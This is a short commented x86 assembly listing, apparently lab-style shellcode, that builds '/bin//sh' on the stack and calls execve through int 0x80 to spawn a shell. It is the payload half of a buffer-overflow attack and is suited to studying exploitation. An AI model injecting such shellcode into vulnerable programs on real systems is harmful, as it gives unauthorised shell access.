section .text
  global _start
    _start:
      ; Store the argument string on stack
      mov  eax, 0
      push eax          ; Use 0 to terminate the string
      push "//sh"
      push "/bin"
      mov  ebx, esp     ; Get the string address

      ; Construct the argument array argv[]
      push eax          ; argv[1] = 0
      push ebx          ; argv[0] points "/bin//sh"
      mov  ecx, esp     ; Get the address of argv[]

      ; For environment variable 
      mov edx, 0        ; No env variables 

      ; Call execve()
      mov  eax, 0     	; eax = 0x00000000
      mov  al, 0x0b     ; eax = 0x0000000b
      int  0x80